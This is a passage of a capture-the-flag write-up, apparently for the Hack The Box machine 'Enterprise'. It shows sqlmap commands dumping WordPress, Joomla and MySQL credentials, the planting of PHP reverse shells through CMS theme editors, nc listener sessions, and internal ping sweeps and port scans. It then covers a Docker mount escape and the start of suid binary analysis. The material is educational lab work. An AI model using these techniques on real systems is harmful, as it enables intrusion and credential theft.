-&lt;span class=&quot;k&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/var/www/html/wp-config.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mysqli&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DB_HOST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;DB_USER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;DB_PASSWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;DB_NAME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;// Test the connection:&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mysqli_connect_errno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()){&lt;/span&gt;
-    &lt;span class=&quot;c1&quot;&gt;// Connection Error&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Couldn't connect to the database: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mysqli_connect_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-
-&lt;span class=&quot;c1&quot;&gt;// test to retireve a post name&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'query'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])){&lt;/span&gt;
-    &lt;span class=&quot;nv&quot;&gt;$query&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'query'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
-    &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;SELECT post_title FROM wp_posts WHERE ID = &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$query&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
-        &lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;fetch_row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])){&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
-        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Failed to read query&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-
-&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt; 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;In this file we can’t get SQL Injection because they cast anyting we input into integer 
-with php type casting, but this can give us information about how much the records from &lt;code class=&quot;highlighter-rouge&quot;&gt;wp_posts&lt;/code&gt; table.&lt;/p&gt;
-
-&lt;p&gt;after got all of this information, i just check out in the wordpress installed on port 80 
-are this vulnerable plugin is installed we can validate it by opening this &lt;code class=&quot;highlighter-rouge&quot;&gt;http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=1&lt;/code&gt;
-and it’s seems installed, first i wanna get information from &lt;code class=&quot;highlighter-rouge&quot;&gt;lcars_dbpost.php&lt;/code&gt; so i create little python script&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://10.10.10.61/wp-content/plugins/lcars/lcars_dbpost.php?query=&quot;&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;150&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;and i got there was more than 40 posts, but the page just published 5 posts, i donno how the exact number becase the machine
-already retired when i write this, i just think maybe the other post not published or still in draft
-and we could seen the draft post using the sql injection on &lt;code class=&quot;highlighter-rouge&quot;&gt;lcars_db.php&lt;/code&gt; I’ll just use Sqlmap for this.&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sqlmap.py -u http://10.10.10.61/wp-conten/plugins/lcars_db.php?query=1 --dbs&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;available databases [9]:
-[*] blah
-[*] information_schema
-[*] joomla
-[*] joomladb
-[*] mysql
-[*] performance_schema
-[*] sys
-[*] wordpress
-[*] wordpressdb
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;I try to extract all information from this database found
-&lt;code class=&quot;highlighter-rouge&quot;&gt;sqlmap -u http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=1 -D wordpress -T wp_users -C user_login,user_pass,user_email --dump --hex --threads 5&lt;/code&gt;&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;DB:wordpress
-
-Table:wp_users
-user : william.riker
-pass : $P$BFf47EOgXrJB3ozBRZkjYcleng2Q.2.
-email : william.riker@enterprise.htb
-
-Table:wp_posts
-I got 1 draft post including password list
-
-Needed somewhere to put some passwords quickly
-ZxJyhGem4k338S2Y 
-enterprisencc170 
-ZD3YxfnSjezg67JZ 
-u*Z14ru0p#ttj83zS6
-
-DB: joomladb 
-prefix : edz2g
-
-Command : sqlmap -u http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=1 -D joomladb -T edz2g_users -C username,password,email --dump --threads 10
-Table : edz2g_users
-+-----------------+--------------------------------------------------------------+--------------------------------+
-| username | password | email |
-+-----------------+--------------------------------------------------------------+--------------------------------+
-| geordi.la.forge | $2y$10$cXSgEkNQGBBUneDKXq9gU.8RAf37GyN7JIrPE7us9UBMR9uDDKaWy | geordi.la.forge@enterprise.htb |
-| Guinan | $2y$10$90gyQVv7oL6CCN8lF/0LYulrjKRExceg2i0147/Ewpb6tBzHaqL2q | guinan@enterprise.htb |
-+-----------------+--------------------------------------------------------------+--------------------------------+
-
-DB: mysql
-user: joomladb  |  2eb70fd4eb74f31283541aad4e83ab6e077bc0df MySQL4.1/MySQL5 : joomlapassword!
-user: root  | 95b8a7b0a041cf2011bea41db57315c603285253 MySQL4.1/MySQL5 : NCC-1701E
-user:wordpressdb | 10c910bc9c2c46140dc275cb69dc6565de125630 MySQL4.1/MySQL5 : passwordwordpress
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;i just try to login to wordpress admin using username &lt;code class=&quot;highlighter-rouge&quot;&gt;william.riker&lt;/code&gt; with every password that we found
-and got &lt;code class=&quot;highlighter-rouge&quot;&gt;u*Z14ru0p#ttj83zS6&lt;/code&gt; as the correct password and logged in to wordpress admin, and just doing common
-way to get reverse shell by modified themes or plugin within wordpress panel editor i am using reverse-shell.php
-from pentestmonkey.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Listening on [0.0.0.0] (family 0, port 9999)
-Connection from [10.10.10.61] port 9999 [tcp/*] accepted (family 2, sport 59474)
-Linux b8319d86d21e 4.10.0-37-generic #41-Ubuntu SMP Fri Oct 6 20:20:37 UTC 2017 x86_64 GNU/Linux
-03:46:41 up 39 min, 0 users, load average: 9.35, 8.68, 8.08
-USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-/bin/sh: 0: can't access tty; job control turned off
-$ hostname
-b8319d86d21e
-$ ip addr
-1: lo: &amp;lt;LOOPBACK,UP,LOWER_UP&amp;gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
-link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
-inet 127.0.0.1/8 scope host lo
-valid_lft forever preferred_lft forever
-8: eth0@if9: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu 1500 qdisc noqueue state UP group default
-link/ether 02:42:ac:11:00:04 brd ff:ff:ff:ff:ff:ff
-inet 172.17.0.4/16 scope global eth0
-valid_lft forever preferred_lft forever    
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;after got reverse shell i try to look what user is available in &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt; directory
-but then i just got &lt;code class=&quot;highlighter-rouge&quot;&gt;user.txt&lt;/code&gt; files saying we’re not on the right place to get flag,
-scanning with &lt;code class=&quot;highlighter-rouge&quot;&gt;LinEnum.sh&lt;/code&gt; and got information we currently inside docker container (becase linenum.sh found file with docker stuff like .dockerenv and so on) and separate from the host.&lt;/p&gt;
-
-&lt;p&gt;before i move to service on port 8080, i wanna do ping sweep and port scan using the reverse shell that we got inside docker container
-so maybe we’ll found another docker machine ip address.&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;for x in $(seq 1 255); do ping -W 1 -c 1 172.17.0.$x | grep from; done&lt;/code&gt;
-And got 4 Ip Address UP&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;UP: 172.17.0.1
-UP: 172.17.0.2
-UP: 172.17.0.3
-UP :172.17.0.4
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;And i run full port scan on each ip address&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$./nc -vz 172.17.0.1 1-65535 2&amp;gt;/dev/stdout | grep 'succeeded!'
-Connection to 172.17.0.1 22 port [tcp/ssh] succeeded!
-Connection to 172.17.0.1 80 port [tcp/http] succeeded!
-Connection to 172.17.0.1 443 port [tcp/https] succeeded!
-Connection to 172.17.0.1 5355 port [tcp/hostmon] succeeded!
-Connection to 172.17.0.1 8080 port [tcp/http-alt] succeeded!
-Connection to 172.17.0.1 32812 port [tcp/*] succeeded!
-
-$./nc -vz 172.17.0.2 1-65535 2&amp;gt;/dev/stdout | grep 'succeeded!'
-Connection to 172.17.0.2 3306 port [tcp/mysql] succeeded!
-
-$./nc -vz 172.17.0.3 1-65535 2&amp;gt;/dev/stdout | grep 'succeeded!'
-Connection to 172.17.0.3 80 port [tcp/http] succeeded!
-
-$./nc -vz 172.17.0.4 1-65535 2&amp;gt;/dev/stdout | grep 'succeeded!'
-Connection to 172.17.0.4 80 port [tcp/http] succeeded!
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;save this information for late and move to the next one is port 8080
-in this we can see they using joomla and we already have the user and the hash password
-but i can’t get to crack it, so just try to use the plain text password that we have before&lt;/p&gt;
-
-&lt;p&gt;So i just found the correct password to login joomla&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ZxJyhGem4k338S2Y (Guinan used to login joomla)
-ZD3YxfnSjezg67JZ (geordi.la.forge used to login joomla)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;after loggedin we just doing similiar thing for wordpress to get reverse shell&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;•% ➜ nc -lvp 1337
-Listening on [0.0.0.0] (family 0, port 1337)
-Connection from [10.10.10.61] port 1337 [tcp/*] accepted (family 2, sport 53630)
-Linux a7018bfdc454 4.10.0-37-generic #41-Ubuntu SMP Fri Oct 6 20:20:37 UTC 2017 x86_64 GNU/Linux
- 16:36:01 up 31 min,  0 users,  load average: 6.57, 9.57, 9.37
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-/bin/sh: 0: can't access tty; job control turned off
-$ hostname
-a7018bfdc454
-$ ip addr
-1: lo: &amp;lt;LOOPBACK,UP,LOWER_UP&amp;gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
-    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
-    inet 127.0.0.1/8 scope host lo
-       valid_lft forever preferred_lft forever
-6: eth0@if7: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu 1500 qdisc noqueue state UP group default
-    link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff
-    inet 172.17.0.3/16 scope global eth0
-       valid_lft forever preferred_lft forever
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;we got ip &lt;code class=&quot;highlighter-rouge&quot;&gt;172.17.0.3&lt;/code&gt; so our information is now complete about the docker ip&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;172.17.0.1 (Host machine)
-172.17.0.2 (Mysql)
-172.17.0.3 (Joomla)
-172.17.0.4 (Wordpress)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;doing enumeration using linenum doesn’t give interesting finding, but we could see there is 
-folder name files and same content with files folder in https service, and i just check using &lt;code class=&quot;highlighter-rouge&quot;&gt;mount -l&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/dev/mapper/enterprise--vg-root on /etc/resolv.conf type ext4 (rw,relatime,errors=remount-ro,data=ordered)
-/dev/mapper/enterprise--vg-root on /etc/hostname type ext4 (rw,relatime,errors=remount-ro,data=ordered)
-/dev/mapper/enterprise--vg-root on /etc/hosts type ext4 (rw,relatime,errors=remount-ro,data=ordered)
-/dev/mapper/enterprise--vg-root on /var/www/html type ext4 (rw,relatime,errors=remount-ro,data=ordered)
-/dev/mapper/enterprise--vg-root on /var/www/html/files type ext4 (rw,relatime,errors=remount-ro,data=ordered)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;so the files folder is mounted same as the folder in https service, so if we add file from this joomla machine,
-it will symlink to the https service, so if we wanna run reverse shell on the host machine we could try to run put the reverse shell files in folder &lt;code class=&quot;highlighter-rouge&quot;&gt;/files/&lt;/code&gt; and
-accessing the file using https service because its running on host machine.&lt;/p&gt;
-
-&lt;p&gt;and we got the host machine reverse shell :D&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;•% ➜ nc -lvp 1332
-Listening on [0.0.0.0] (family 0, port 1332)
-Connection from [10.10.10.61] port 1332 [tcp/*] accepted (family 2, sport 36426)
-Linux enterprise.htb 4.10.0-37-generic #41-Ubuntu SMP Fri Oct 6 20:20:37 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
- 16:53:37 up 49 min,  0 users,  load average: 2.30, 2.69, 4.79
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-/bin/sh: 0: can't access tty; job control turned off
-$ ip addr
-1: lo: &amp;lt;LOOPBACK,UP,LOWER_UP&amp;gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
-    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
-    inet 127.0.0.1/8 scope host lo
-       valid_lft forever preferred_lft forever
-    inet6 ::1/128 scope host
-       valid_lft forever preferred_lft forever
-2: ens33: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
-    link/ether 00:50:56:b9:9d:69 brd ff:ff:ff:ff:ff:ff
-    inet 10.10.10.61/24 brd 10.10.10.255 scope global ens33
-       valid_lft forever preferred_lft forever
-    inet6 dead:beef::250:56ff:feb9:9d69/64 scope global mngtmpaddr dynamic
-       valid_lft 86052sec preferred_lft 14052sec
-    inet6 fe80::250:56ff:feb9:9d69/64 scope link
-       valid_lft forever preferred_lft forever
-3: docker0: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu 1500 qdisc noqueue state UP group default
-    link/ether 02:42:91:d8:42:b3 brd ff:ff:ff:ff:ff:ff
-    inet 172.17.0.1/16 scope global docker0
-       valid_lft forever preferred_lft forever
-    inet6 fe80::42:91ff:fed8:42b3/64 scope link
-       valid_lft forever preferred_lft forever
-5: vethd83e040@if4: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu 1500 qdisc noqueue master docker0 state UP group default
-    link/ether b2:e4:8e:a9:90:0e brd ff:ff:ff:ff:ff:ff link-netnsid 0
-    inet6 fe80::b0e4:8eff:fea9:900e/64 scope link
-       valid_lft forever preferred_lft forever
-7: veth58ffdf7@if6: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu 1500 qdisc noqueue master docker0 state UP group default
-    link/ether de:07:fa:9f:e5:b9 brd ff:ff:ff:ff:ff:ff link-netnsid 2
-    inet6 fe80::dc07:faff:fe9f:e5b9/64 scope link
-       valid_lft forever preferred_lft forever
-9: vethb9c7e9a@if8: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu 1500 qdisc noqueue master docker0 state UP group default
-    link/ether ca:eb:0a:77:b6:12 brd ff:ff:ff:ff:ff:ff link-netnsid 1
-    inet6 fe80::c8eb:aff:fe77:b612/64 scope link
-       valid_lft forever preferred_lft forever
-$ hostname
-enterprise.htb
-$ ls /home
-jeanlucpicard
-$ ls /home/jeanlucpicard/
-user.txt
-$ cat /home/jeanlucpicard/user.txt
-08552d48aa6[REDACTED]7f1b4ba8747
-$
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;after got the flag for user, i try to enumerate the host machine using &lt;code class=&quot;highlighter-rouge&quot;&gt;LinEnum.sh&lt;/code&gt; to find a way to get root privilage
-and from the LinEnum result just got binary &lt;code class=&quot;highlighter-rouge&quot;&gt;lcars&lt;/code&gt; with suid running in port &lt;code class=&quot;highlighter-rouge&quot;&gt;32812&lt;/code&gt; so i think
-the only way to get root is from exploiting this binary, i start to doing static analysis the binary using ida.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;•% ➜ checksec lcars
-Arch: i386-32-little
-RELRO: Partial RELRO
-Stack: No canary found
-NX: NX disabled
-PIE: PIE enabled
-RWX: Has RWX segments
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/ida.png&quot; alt=&quot;Ida Decompile&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;this binary prompt access code before we can access their menu, you can found the access code using &lt;code class=&quot;highlighter-rouge&quot;&gt;ltrace&lt;/code&gt; because 
-the binary is using &lt;code class=&quot;highlighter-rouge&quot;&gt;strcmp&lt;/code&gt; to compare with our input&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜ ltrace ./lcars
-__libc_start_main(0x56640c91, 1, 0xff8de674, 0x56640d30 &amp;lt;unfinished ...&amp;gt;
-setresuid(0, 0, 0, 0x56640ca8)                                                                     = 0xffffffff
-puts(&quot;&quot;
-)                                                                                           = 1
-puts(&quot;                 _______ _______&quot;...                 _______ _______  ______ _______
-)                                                        = 49
-puts(&quot;          |      |       |_____|&quot;...          |      |       |_____| |_____/ |______
-)                                                        = 49
-puts(&quot;          |_____ |_____  |     |&quot;...          |_____ |_____  |     | |    \_ ______|
-)                                                        = 49
-puts(&quot;&quot;
-)                                                                                           = 1
-puts(&quot;Welcome to the Library Computer &quot;...Welcome to the Library Computer Access and Retrieval System
-
-)                                                        = 61
-puts(&quot;Enter Bridge Access Code: &quot;Enter Bridge Access Code:
-)                                                                 = 27
-fflush(0xf7ebdd60)                                                                                 = 0
-fgets(x
-&quot;x\n&quot;, 9, 0xf7ebd5a0)                                                                        = 0xff8de5b7
-strcmp(&quot;x\n&quot;, &quot;picarda1&quot;)                                                                          = 1
-puts(&quot;\nInvalid Code\nTerminating Consol&quot;...
-Invalid Code
-Terminating Console
-
-)                                                      = 35
-fflush(0xf7ebdd60)                                                                                 = 0
-exit(0 &amp;lt;no return ...&amp;gt;
-+++ exited (status 0) +++
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;we got &lt;em&gt;picarda1&lt;/em&gt; as access code, then from ida decompile we got this&lt;/p&gt;
-
-&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main_menu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// eax@2&lt;/span&gt;
-  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+Ch] [bp-19Ch]@2&lt;/span&gt;
-  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+D4h] [bp-D4h]@1&lt;/span&gt;
-  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+D8h] [bp-D0h]@5&lt;/span&gt;
-
-  &lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;startScreen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
